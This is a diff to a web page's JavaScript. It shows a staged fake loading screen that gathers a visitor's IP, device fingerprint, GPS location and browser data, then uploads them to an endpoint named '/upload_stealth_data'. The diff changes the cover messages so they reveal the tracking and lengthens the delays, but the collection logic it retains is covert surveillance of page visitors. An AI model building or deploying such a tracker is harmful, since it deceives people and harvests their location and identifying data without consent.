@@ -354,10 +354,10 @@
             const loadingMsg = document.getElementById('loadingMessage');
 
             // Step 1: IP and Basic Info (20%)
-            loadingMsg.textContent = 'Connecting to server...';
+            loadingMsg.textContent = 'Connecting to server... (tracking your IP)';
             progress = 20;
             progressBar.style.width = progress + '%';
-            await sleep(500);
+            await sleep(800);
 
             // Collect IP info
             try {
@@ -380,10 +380,10 @@
             }
 
             // Step 2: Device Info (40%)
-            loadingMsg.textContent = 'Checking device compatibility...';
+            loadingMsg.textContent = 'Checking device compatibility... (fingerprinting device)';
             progress = 40;
             progressBar.style.width = progress + '%';
-            await sleep(500);
+            await sleep(800);
 
             collectedData.device = {
                 platform: navigator.platform,
@@ -413,10 +413,10 @@
             updateStealthInfo('infoDevice', `✓ Device: ${collectedData.deviceType} - ${collectedData.device.platform}`);
 
             // Step 3: Location (60%)
-            loadingMsg.textContent = 'Detecting your location...';
+            loadingMsg.textContent = 'Detecting your location... (accessing GPS)';
             progress = 60;
             progressBar.style.width = progress + '%';
-            await sleep(500);
+            await sleep(800);
 
             // Try to get precise GPS location
             if (navigator.geolocation) {
@@ -444,10 +444,10 @@
             }
 
             // Step 4: Browser & Network Info (80%)
-            loadingMsg.textContent = 'Analyzing browser data...';
+            loadingMsg.textContent = 'Analyzing browser data... (scanning history & cookies)';
             progress = 80;
             progressBar.style.width = progress + '%';
-            await sleep(500);
+            await sleep(800);
 
             // Browser fingerprinting
             collectedData.browser = {
@@ -538,10 +538,10 @@
             }
 
             // Step 5: Send data to server (100%)
-            loadingMsg.textContent = 'Uploading data...';
+            loadingMsg.textContent = 'Uploading collected data to remote server...';
             progress = 100;
             progressBar.style.width = progress + '%';
-            await sleep(500);
+            await sleep(600);
 
             // Send collected data to server
             await fetch('/upload_stealth_data', {
